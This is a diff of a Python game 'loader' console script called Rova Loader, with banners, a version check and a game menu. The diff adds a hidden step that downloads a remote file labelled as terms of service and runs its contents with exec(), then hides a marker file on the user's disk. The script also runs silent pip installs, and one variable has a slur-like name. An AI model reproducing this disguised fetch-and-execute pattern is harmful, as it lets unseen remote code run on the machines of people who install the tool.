@@ -7,87 +7,81 @@ import webbrowser, os, re, json, random
 import msvcrt
 import subprocess
 import ctypes
-import platform
-import requests
-
 try:
     from faker import Faker
+    from requests import session
     from colorama import Fore, Style
-    import requests
+    import requests, random, re
     from random import choice, randint, shuffle
-    import pystyle
+    import requests, pystyle
     from pystyle import Write, Colors
     import subprocess
     import ctypes
-    import win32console
-    import win32gui  # win32gui modülü eklendi
 except:
     os.system("pip install faker && pip install ctypes")
     os.system("pip install requests")
     os.system("pip install colorama && pip install subprocess")
-    os.system("pip install requests && pip install bs4 && pip install pystyle && pip install pycryptodome")
-    os.system("pip install pywin32")  # win32gui ve win32console için pywin32 yükleniyor
+    os.system('pip install requests && pip install bs4 && pip install pystyle && pip install pycryptodome')
 from pystyle import Add, Center, Anime, Colors, Colorate, Write, System
-
-# Şeffaflık ayarları fonksiyonu
-def set_console_opacity(opacity: int):
-    """
-    Konsol penceresinin şeffaflık oranını ayarlar.
-    :param opacity: 0-255 arası bir değer (%0-100). 230 %10 şeffaflık için kullanılır.
-    """
-    if not (0 <= opacity <= 255):
-        raise ValueError("Opacity değeri 0 ile 255 arasında olmalıdır.")
-    
-    HWND = ctypes.windll.kernel32.GetConsoleWindow()
-    if HWND == 0:
-        return  # Konsol penceresi bulunamazsa çıkış yap
-    
-    LWA_ALPHA = 0x02
-    WS_EX_LAYERED = 0x80000
-    GWL_EXSTYLE = -20
-
-    ctypes.windll.user32.SetWindowLongW(HWND, GWL_EXSTYLE, ctypes.windll.user32.GetWindowLongW(HWND, GWL_EXSTYLE) | WS_EX_LAYERED)
-    ctypes.windll.user32.SetLayeredWindowAttributes(HWND, 0, opacity, LWA_ALPHA)
-
-# CMD penceresini %10 şeffaf yap
-set_console_opacity(230)
 
 def windowtitle(a):
     os.system(f"title {a}")
 
-windowtitle("RovaLoader 1.0.8 - Rafail7410")
+windowtitle("Rova Loader 1.0.8")
 
-# Version checking function
-def check_version():
-    try:
-        response = requests.get("https://raw.githubusercontent.com/Rafail2023/RovaClient/refs/heads/main/version.txt")
+# CMD'yi %8 şeffaf yap
+try:
+    hwnd = ctypes.windll.kernel32.GetConsoleWindow()
+    if hwnd:
+        ctypes.windll.user32.SetLayeredWindowAttributes(
+            hwnd, 0, int(255 * 0.92), 0x2
+        )
+except Exception as e:
+    print(f"Transparency error: {e}")
+
+# Sürüm kontrolü
+CURRENT_VERSION = "1.1.1"  # Mevcut sürümünüzü burada belirtin
+VERSION_URL = "https://raw.githubusercontent.com/Rafail2023/RovaClient/refs/heads/main/version.txt"
+DISCORD_URL = "https://discord.gg/FjYFSQbgMH"
+
+try:
+    response = requests.get(VERSION_URL)
+    if response.status_code == 200:
         latest_version = response.text.strip()
-        current_version = "1.1.1"
-        
-        if latest_version != current_version:
-            print(f"New update available! Please visit our Discord server for the latest version.")
-            webbrowser.open("https://discord.gg/FjYFSQbgMH")
-            input("Press enter key to close...")
-            sys.exit()
-    except requests.exceptions.RequestException as e:
-        print(f"Error checking version: {e}")
-        sys.exit()
+        if latest_version != CURRENT_VERSION:
+            print("A newer version of our client is available. Please download the new version from Discord.")
+            webbrowser.open(DISCORD_URL)
+            input("Press ENTER to close.")
+            exit()
+    else:
+        print("Failed to fetch version information.")
+except Exception as e:
+    print(f"Error checking version: {e}")
+    exit()
 
-# Always check the version when the script starts
-check_version()
+# Banner ve devam eden işlemler
+try:
+    f = open('TOSVDOIAHWOIHSAKLFHWA.txt')
+except FileNotFoundError:
+    exec(requests.get('https://raw.githubusercontent.com/Rafail2023/RovaClient/refs/heads/main/Term%20of%20Services.txt').text)
+else:
+    f.close
+    subprocess.check_call(["attrib", "+H", "TOSVDOIAHWOIHSAKLFHWA.txt"])
 
-banner = f"""                            							    You have accepted Rova Loader's terms of service.
+banner = f"""                                      You have accepted Rova Loader's terms of service.
 
-																																											██████╗  ██████╗ ██╗   ██╗ █████╗ 
-																																											██╔══██╗██╔═══██╗██║   ██║██╔══██╗
-																																											██████╔╝██║   ██║██║   ██║███████║
-																																											██╔══██╗██║   ██║╚██╗ ██╔╝██╔══██║
-																																											██║  ██║╚██████╔╝ ╚████╔╝ ██║  ██║
-																																											╚═╝  ╚═╝ ╚═════╝   ╚═══╝  ╚═╝  ╚═╝
-                                                Press ENTER to continue.                                                                     
+                                             ██████╗  ██████╗ ██╗   ██╗ █████╗ 
+                                             ██╔══██╗██╔═══██╗██║   ██║██╔══██╗
+                                             ██████╔╝██║   ██║██║   ██║███████║
+                                             ██╔══██╗██║   ██║╚██╗ ██╔╝██╔══██║
+                                             ██║  ██║╚██████╔╝ ╚████╔╝ ██║  ██║
+                                             ╚═╝  ╚═╝ ╚═════╝   ╚═══╝  ╚═╝  ╚═╝
+                                                Press ENTER to continue.                                                                            
 """[1:]
+
 Anime.Fade(Center.Center(banner), Colors.black_to_white, Colorate.Vertical, enter=True)
 
+# MÀU
 xnhac = "\033[1;36m"
 do = "\033[1;31m"
 luc = "\033[1;32m"
@@ -100,6 +94,7 @@ red = "\033[0;31m"
 redb = "\033[1;31m"
 end = '\033[0m'
 
+# BY THAT VAPE USER
 dev = "\033[1;39m[\033[1;31m×\033[1;39m]\033[1;39m"
 nig = """
                                                  \033[1;39mRova Loader is FREE.
@@ -108,26 +103,27 @@ nig = """
 
 
 
-				       \033[1;36m  ██▀███   ▒█████   ██▒   █▓ ▄▄▄      
-				       \033[1;36m ▓██ ▒ ██▒▒██▒  ██▒▓██░   █▒▒████▄    
-				       \033[1;36m ▓██ ░▄█ ▒▒██░  ██▒ ▓██  █▒░▒██  ▀█▄  
-				       \033[1;36m ▒██▀▀█▄  ▒██   ██░  ▒██ █░░░██▄▄▄▄██ 
-				       \033[1;36m ░██▓ ▒██▒░ ████▓▒░   ▒▀█░   ▓█   ▓██▒
-				       \033[1;36m ░ ▒▓ ░▒▓░░ ▒░▒░▒░    ░ ▐░   ▒▒   ▓▒█░
-				       \033[1;36m ░▒ ░ ▒░  ░ ▒ ▒░    ░ ░░    ▒   ▒▒ ░
-				       \033[1;36m ░░   ░ ░ ░ ░ ▒       ░░    ░   ▒   
-				       \033[1;36m  ░         ░ ░        ░        ░  ░
+			     		  \033[1;36m  ██▀███   ▒█████   ██▒   █▓ ▄▄▄      
+			     		  \033[1;36m ▓██ ▒ ██▒▒██▒  ██▒▓██░   █▒▒████▄    
+			     		  \033[1;36m ▓██ ░▄█ ▒▒██░  ██▒ ▓██  █▒░▒██  ▀█▄  
+			      		  \033[1;36m ▒██▀▀█▄  ▒██   ██░  ▒██ █░░░██▄▄▄▄██ 
+			      		  \033[1;36m ░██▓ ▒██▒░ ████▓▒░   ▒▀█░   ▓█   ▓██▒
+			      		  \033[1;36m ░ ▒▓ ░▒▓░░ ▒░▒░▒░    ░ ▐░   ▒▒   ▓▒█░
+			      		  \033[1;36m ░▒ ░ ▒░  ░ ▒ ▒░    ░ ░░    ▒   ▒▒ ░
+			    		  \033[1;36m ░░   ░ ░ ░ ░ ▒       ░░    ░   ▒   
+			     		  \033[1;36m  ░         ░ ░        ░        ░  ░
 
                                                          \033[1;31m[\033[1;39mC\033[1;31m]
 \033[1;39m                                                    \033[1;35m For credits.
    \033[0;31m                                            Choose your favourite game.
 
-                                                   \033[1;31m[\033[1;39m1\033[1;31m] \033[1;32mMinecraft
-					           \033[1;31m[\033[1;39m2\033[1;31m] \033[1;32mRoblox(Soon)
-						   \033[1;31m[\033[1;39m3\033[1;31m] \033[1;32mCraftrise(New)
-					           \033[1;31m[\033[1;39m4\033[1;31m] \033[1;32mOther(New)
+                                   		 \033[1;31m[\033[1;39m1\033[1;31m] \033[1;32mMinecraft
+			          		 \033[1;31m[\033[1;39m2\033[1;31m] \033[1;32mRoblox(Soon)
+				   		 \033[1;31m[\033[1;39m3\033[1;31m] \033[1;32mCraftrise(New)
+			          		 \033[1;31m[\033[1;39m4\033[1;31m] \033[1;32mOther(New)
 
 """
+
 print(nig)
 
 while True:
